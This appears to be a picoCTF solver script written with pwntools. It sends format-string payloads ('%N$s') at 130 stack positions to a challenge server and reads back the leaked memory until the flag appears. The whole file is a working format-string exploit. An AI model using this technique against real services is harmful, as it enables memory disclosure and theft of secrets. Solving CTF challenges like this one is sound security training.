#!/usr/bin/env python3
from pwn import context, ELF, remote

# Setting up the context for the binary
elf = context.binary = ELF("./vuln", checksec=False)
context.log_level = "error"

# Iterate through possible format string positions
for x in range(130):
    try:
        # Establish a remote connection
        p = remote('saturn.picoctf.net', 52373)
        
        # Wait for the prompt
        p.recvuntil(b">> ")
        
        # Send the format string payload
        p.sendline('%{}$s'.format(x).encode())
        
        # Skip the initial response
        p.recvline()
        
        # Read the response
        leaked = p.recvline()
        
        # Decode the response, ignoring errors
        leaked_decoded = leaked.decode(errors='ignore').strip()
        
        # Check if the response contains the flag
        if "CTF{" in leaked_decoded:
            print(f"Flag: pico{leaked_decoded}")
            break
        else:
            print(leaked_decoded)
    except EOFError:
        pass  # If there's an EOF error, continue to the next iteration
